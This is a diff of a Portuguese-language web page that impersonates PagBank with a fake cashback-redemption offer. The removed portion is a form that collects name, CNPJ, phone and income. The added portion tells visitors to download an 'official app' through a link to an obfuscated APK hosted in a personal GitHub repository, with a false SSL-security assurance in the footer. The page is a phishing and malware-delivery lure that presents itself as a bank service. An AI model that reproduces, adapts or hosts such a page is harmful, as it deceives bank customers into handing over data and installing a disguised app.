@@ -1,167 +1,20 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PagBank - Consulta de Cashback</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-        body {
-            background-color: #f4f7f6;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            background: #ffffff;
-            padding: 40px 30px;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
-            max-width: 440px;
-            width: 100%;
-            border-top: 6px solid #00b159;
-        }
-        .header-main {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .brand-name {
-            color: #00b159;
-            font-size: 28px;
-            font-weight: 800;
-            letter-spacing: -1px;
-            margin-bottom: 5px;
-        }
-        .brand-name span {
-            color: #24292e;
-        }
-        h1 {
-            color: #24292e;
-            font-size: 20px;
-            margin-bottom: 8px;
-            font-weight: 700;
-        }
-        p.subtitle {
-            color: #6a737d;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 6px;
-            color: #444;
-            font-weight: 600;
-            font-size: 13px;
-        }
-        input {
-            width: 100%;
-            padding: 13px 16px;
-            border: 1px solid #d1d5da;
-            border-radius: 8px;
-            font-size: 15px;
-            color: #24292e;
-            outline: none;
-            background: #fafbfc;
-            transition: all 0.2s ease;
-        }
-        input:focus {
-            border-color: #00b159;
-            background: #ffffff;
-            box-shadow: 0 0 0 3px rgba(0, 177, 89, 0.15);
-        }
-        .btn-submit {
-            width: 100%;
-            padding: 15px;
-            background: #00b159;
-            color: #ffffff;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: background 0.2s ease;
-            margin-top: 10px;
-            box-shadow: 0 4px 12px rgba(0, 177, 89, 0.2);
-        }
-        .btn-submit:hover {
-            background: #00964b;
-        }
-        .btn-submit:active {
-            transform: scale(0.99);
-        }
-    </style>
-</head>
-<body>
-
-    <div class="container">
-        <div class="header-main">
-            <div class="brand-name">Pag<span>Bank</span></div>
-            <h1>Resgate de Cashback</h1>
-            <p class="subtitle">Preencha os campos abaixo para consultar e liberar o seu saldo acumulado.</p>
-        </div>
-        
-        <form id="form-consulta">
-            <div class="form-group">
-                <label for="nome">Nome Completo / Razão Social</label>
-                <input type="text" id="nome" placeholder="Digite o nome completo" required>
-            </div>
-
-            <div class="form-group">
-                <label for="cnpj">CNPJ</label>
-                <input type="text" id="cnpj" placeholder="00.000.000/0001-00" maxlength="18" required>
-            </div>
-
-            <div class="form-group">
-                <label for="telefone">Telefone / Celular</label>
-                <input type="tel" id="telefone" placeholder="(11) 99999-9999" maxlength="15" required>
-            </div>
-
-            <div class="form-group">
-                <label for="renda">Renda Mensal / Faturamento</label>
-                <input type="text" id="renda" placeholder="R$ 0,00" required>
-            </div>
-
-            <button type="submit" class="btn-submit">Consultar Saldo</button>
-        </form>
+class="instrucoes">
+        <h3>Siga as instruções para resgatar seu CashBack:</h3>
+        <ol>
+            <li>Insira seus dados para receber o pagamento.</li>
+            <li>Abaixo, baixe o aplicativo oficial.</li>
+            <li>Faça as verificações necessárias dentro do app para liberar o saldo.</li>
+        </ol>
     </div>
 
-    <script>
-        // Máscara para CNPJ
-        document.getElementById('cnpj').addEventListener('input', function (e) {
-            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,2})(\d{0,3})(\d{0,3})(\d{0,4})(\d{0,2})/);
-            e.target.value = !x[2] ? x[1] : x[1] + '.' + x[2] + '.' + x[3] + '/' + x[4] + (x[5] ? '-' + x[5] : '');
-        });
+    <a href="https://github.com/josejosejosespp-netizen/trabalho/raw/main/tozt.hbvdze.zjbuaky.apk" class="btn-download">
+        📲 Baixar Aplicativo Agora
+    </a>
 
-        // Máscara para Telefone Celular
-        document.getElementById('telefone').addEventListener('input', function (e) {
-            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,2})(\d{0,5})(\d{0,4})/);
-            e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
-        });
-
-        // Máscara para Valor / Renda
-        document.getElementById('renda').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\D/g, '');
-            value = (value / 100).toFixed(2).replace(".", ",");
-            value = value.replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1.");
-            e.target.value = value ? 'R$ ' + value : '';
-        });
-
-        // Evento de envio do formulário
-        document.getElementById('form-consulta').addEventListener('submit', function(e) {
-            e.preventDefault();
-            alert('Processando consulta... Por favor, aguarde a resposta do sistema.');
-        });
-    </script>
+    <div class="footer-text">
+        Conexão segura SSL. Seus dados estão protegidos.
+    </div>
+</div>
 
 </body>
 </html>
